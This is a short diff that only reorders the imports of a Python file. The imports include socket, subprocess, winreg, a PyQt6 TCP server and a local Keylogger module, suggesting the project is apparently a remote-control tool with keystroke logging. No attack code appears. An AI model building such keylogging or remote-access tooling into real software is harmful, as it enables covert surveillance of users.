@@ -1,13 +1,13 @@
-import socket
+from PyQt6.QtNetwork import QTcpServer, QHostAddress, QAbstractSocket
+from PyQt6.QtWidgets import QApplication
 from serverDesigner import ServerDesigner
-import globalVar
+import socket
 import sys
 import os
 import re
-import subprocess
 import winreg
-from PyQt6.QtWidgets import QApplication
-from PyQt6.QtNetwork import QTcpServer, QHostAddress, QAbstractSocket
+import globalVar
+import subprocess
 from keylogger import Keylogger
 
 
